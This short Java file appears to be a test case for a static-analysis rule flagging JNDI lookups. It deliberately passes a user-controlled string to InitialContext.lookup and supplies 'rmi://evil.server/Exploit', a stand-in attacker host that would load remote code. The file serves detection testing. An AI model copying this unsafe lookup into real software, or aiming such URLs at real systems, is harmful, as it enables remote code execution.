import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class BanJNDIBug {

    public String showBug(String jndiUrl) throws NamingException {
        Context cxt = new InitialContext(); // Mutated variable name from 'ctx' to 'cxt'
        Object object = cxt.lookup(jndiUrl); // BUG: BanJNDI
        return object.toString();
    }

    public static void main(String[] args) throws NamingException {
        BanJNDIBug bug = new BanJNDIBug();
        String userInput = "rmi://evil.server/Exploit";
        System.out.println(bug.showBug(userInput));
    }
}